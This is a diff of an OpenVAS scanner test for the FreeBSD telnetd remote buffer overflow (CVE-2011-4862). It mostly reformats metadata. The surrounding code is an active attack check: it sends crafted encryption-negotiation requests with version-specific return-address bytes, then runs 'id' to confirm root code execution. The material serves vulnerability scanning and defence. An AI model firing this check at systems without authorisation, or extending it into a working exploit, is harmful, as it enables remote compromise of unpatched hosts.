@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_freebsd_telnetd_51182.nasl 9351 2018-04-06 07:05:43Z cfischer $
+# $Id: gb_freebsd_telnetd_51182.nasl 11997 2018-10-20 11:59:41Z mmartin $
 #
 # FreeBSD 'telnetd' Daemon Remote Buffer Overflow Vulnerability
 #
@@ -25,41 +25,38 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "FreeBSD is prone to a remote buffer-overflow vulnerability.
+if (description)
+{
+  script_oid("1.3.6.1.4.1.25623.1.0.103373");
+  script_bugtraq_id(51182);
+  script_cve_id("CVE-2011-4862");
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_version("$Revision: 11997 $");
+
+  script_name("FreeBSD 'telnetd' Daemon Remote Buffer Overflow Vulnerability");
+
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51182");
+  script_xref(name:"URL", value:"http://www.freebsd.org/");
+  script_xref(name:"URL", value:"http://security.freebsd.org/advisories/FreeBSD-SA-11:08.telnetd.asc");
+
+  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
+  script_tag(name:"creation_date", value:"2011-12-28 12:32:36 +0100 (Wed, 28 Dec 2011)");
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_category(ACT_ATTACK);
+  script_family("Buffer overflow");
+  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl");
+  script_require_ports("Services/telnet", 23);
+  script_tag(name:"solution", value:"Updates are available to address this issue. Please see the references
+for more information.");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"summary", value:"FreeBSD is prone to a remote buffer-overflow vulnerability.
 
 Exploiting this issue allows remote attackers to execute arbitrary
 code with superuser privileges. Successfully exploiting this issue
-will completely compromise affected computers.";
-
-tag_solution = "Updates are available to address this issue. Please see the references
-for more information.";
-
-if (description)
-{
- script_oid("1.3.6.1.4.1.25623.1.0.103373");
- script_bugtraq_id(51182);
- script_cve_id("CVE-2011-4862");
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- script_version ("$Revision: 9351 $");
-
- script_name("FreeBSD 'telnetd' Daemon Remote Buffer Overflow Vulnerability");
-
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51182");
- script_xref(name : "URL" , value : "http://www.freebsd.org/");
- script_xref(name : "URL" , value : "http://security.freebsd.org/advisories/FreeBSD-SA-11:08.telnetd.asc");
-
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
- script_tag(name:"creation_date", value:"2011-12-28 12:32:36 +0100 (Wed, 28 Dec 2011)");
- script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_ATTACK);
- script_family("Buffer overflow");
- script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl");
- script_require_ports("Services/telnet", 23);
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+will completely compromise affected computers.");
+  exit(0);
 }
 
 include("telnet_func.inc");
@@ -72,7 +69,7 @@ if(!get_port_state(port))exit(0);
 banner = get_telnet_banner(port:port);
 if(!banner || "FreeBSD" >!< banner)exit(0);
 
-fbsd[0] = raw_string(0xed,0xee); # FreeBSD 8.0 & 8.1 
+fbsd[0] = raw_string(0xed,0xee); # FreeBSD 8.0 & 8.1
 fbsd[1] = raw_string(0xa6,0xee); # FreeBSD 8.2
 fbsd[2] = raw_string(0x86,0xde); # FreeBSD 7.2 & 7.3 & 7.4
 
@@ -87,7 +84,7 @@ foreach bsd (fbsd) {
 
   send(socket:soc,data:req);
 
-  recv = recv(socket:soc,length:8192); 
+  recv = recv(socket:soc,length:8192);
   if(!recv || strlen(recv) < 8 || hexstr(recv) !~ "fffa260201") {
     close(soc);
     exit(0); # telnetd does not support encryption
@@ -112,7 +109,7 @@ foreach bsd (fbsd) {
 
   send(socket:soc,data:req);
   send(socket:soc,data:raw_string(0x69,0x64,0x0a)); # command: id
-    
+
   recv = recv(socket:soc,length:8192);
 
   close(soc);
@@ -120,7 +117,7 @@ foreach bsd (fbsd) {
   if(recv =~ "uid=[0-9]+.*gid=[0-9]+") {
     security_message(port:port);
     exit(0);
-  }  
+  }
 }
 
 exit(0);
